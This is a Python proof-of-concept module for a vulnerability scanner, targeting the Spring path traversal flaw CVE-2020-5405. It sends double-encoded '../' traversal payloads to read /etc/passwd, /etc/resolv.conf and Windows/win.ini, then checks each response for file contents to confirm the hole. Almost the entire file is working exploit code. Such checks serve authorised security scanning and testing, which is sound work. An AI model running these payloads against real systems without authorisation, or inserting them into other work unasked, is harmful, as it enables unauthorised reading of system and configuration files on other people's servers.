#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'CVE-2020-5405'
        self.keyword = ['spring']
        self.info = 'spring read file (CVE-2020-5405)'
        self.type = 'file'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
                self.url_normpath(self.url, '')
            ]))
            async with ClientSession() as session:
                for path in path_list:
                    pocs = ['a/a/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f../etc/passwd',
                             'a/a/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f../etc/resolv.conf',
                            'a/a/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f../Windows/win.ini',
                             ]
                    for poc in pocs:
                        url = path + poc
                        async with session.get(url=url) as res:
                            if res:
                                text = await res.text()
                                if "root:" in text or "nameserver" in text or '[extensions]' in text:
                                    self.flag = 1
                                    self.res.append({"info": url, "key": "Spring read file CVE-2020-5405"})
                                    return
